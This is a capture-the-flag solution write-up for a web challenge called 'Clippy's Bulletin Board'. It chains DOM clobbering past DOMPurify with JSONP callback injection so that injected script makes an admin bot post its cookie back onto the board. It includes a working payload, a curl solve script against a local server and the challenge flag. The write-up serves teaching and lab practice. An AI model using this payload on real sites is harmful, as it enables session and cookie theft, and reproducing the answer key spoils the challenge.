# Solution: Clippy's Bulletin Board

## Vulnerability Chain: DOM Clobbering → XSS → Cookie Theft

This challenge chains three vulnerabilities:

1. **DOM Clobbering** — Inject HTML elements that override `window.appConfig`
2. **JSONP Injection** — The `/api/callback` endpoint reflects unsanitized callback names as JavaScript
3. **XSS via Admin Bot** — The admin bot visits with a `flag` cookie readable by injected scripts

## Step 1: Understand the Vulnerable Code

In `app.js`, the `checkPremiumConfig` function runs after posts load:

```javascript
function checkPremiumConfig() {
    var cfg = window.appConfig;
    if (cfg && cfg.dataEndpoint) {
        var s = document.createElement('script');
        s.src = cfg.dataEndpoint.toString();
        document.head.appendChild(s);
    }
}
```

If `window.appConfig` exists and has a `dataEndpoint` property, it creates a `<script>` tag
with `src` set to `dataEndpoint.toString()`. Since `window.appConfig` is never defined in code,
it's normally `undefined` — but DOM clobbering can create it.

## Step 2: DOM Clobbering

DOMPurify sanitizes user HTML but allows `id`, `name`, and `href` attributes. By posting two
`<a>` elements with the same `id`, we clobber `window.appConfig`:

```html
<a id="appConfig"></a><a id="appConfig" name="dataEndpoint" href="CONTROLLED_URL"></a>
```

How it works:
- Two elements with `id="appConfig"` → `window.appConfig` becomes an **HTMLCollection**
- HTMLCollection supports named property access → `.dataEndpoint` finds the element with `name="dataEndpoint"`
- `<a>.toString()` returns the anchor's resolved **href** URL

## Step 3: JSONP Endpoint

The server has a JSONP endpoint at `/api/callback?cb=ANYTHING`:

```
GET /api/callback?cb=alert
→ alert({"status":"ok"})
```

The `cb` parameter is reflected unsanitized into a JavaScript response. We can use this to
execute arbitrary JavaScript by setting `cb` to our payload.

## Step 4: Craft the Payload

Combine DOM clobbering with JSONP to steal the admin's cookies:

```html
<a id="appConfig"></a><a id="appConfig" name="dataEndpoint" href="/api/callback?cb=fetch('/api/post',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({author:'Admin',content:document.cookie})});//"></a>
```

This payload:
1. Clobbers `window.appConfig.dataEndpoint` to point to the JSONP endpoint
2. The JSONP callback executes: `fetch('/api/post', ...)` — posting `document.cookie` as a bulletin board message
3. The `//` at the end comments out the `({"status":"ok"})` suffix

## Step 5: Trigger the Admin Bot

1. Post the payload to the bulletin board
2. Click **"Report to Admin"** button
3. The admin bot visits the page with your session (seeing your posts) and a `flag=RCCTF{...}` cookie
4. The clobbered script fires, reads the admin's cookie, and POSTs it as a new message
5. Wait ~5 seconds, then refresh — the flag appears as a post from "Admin"

## Solve Script

```bash
# Get a session
COOKIES=$(mktemp)
curl -s -c $COOKIES http://localhost:1337/ > /dev/null

# Post the DOM clobbering payload
curl -s -b $COOKIES -X POST http://localhost:1337/api/post \
  -H 'Content-Type: application/json' \
  -d '{"author":"hacker","content":"<a id=\"appConfig\"></a><a id=\"appConfig\" name=\"dataEndpoint\" href=\"/api/callback?cb=fetch(%27/api/post%27,{method:%27POST%27,headers:{%27Content-Type%27:%27application/json%27},body:JSON.stringify({author:%27Admin%27,content:document.cookie})});//\"></a>"}'

# Report to admin bot
curl -s -b $COOKIES -X POST http://localhost:1337/api/report

# Wait for bot to visit and XSS to fire
sleep 5

# Check posts for the flag
curl -s -b $COOKIES http://localhost:1337/api/posts | python3 -c "
import sys, json
for p in json.load(sys.stdin):
    if 'RCCTF' in p.get('content','') or 'flag=' in p.get('content',''):
        print('FLAG FOUND:', p['content'])
"
```

## Key Concepts

- **DOM Clobbering**: HTML elements with `id`/`name` attributes create properties on `window`, overriding undefined JavaScript variables
- **HTMLCollection**: Two elements sharing an ID create a collection with named item access via `name` attribute
- **Anchor toString()**: `<a>` elements' `toString()` returns the `href` URL
- **JSONP Injection**: Unsanitized callback parameters allow arbitrary JS execution
- **DOMPurify limitations**: Default config blocks scripts/events but allows `id`, `name`, `href` — enabling DOM clobbering

## Flag

```
RCCTF{cl1ppy_w4rn3d_y0u_4b0ut_d0m_cl0bb3r1ng}
```
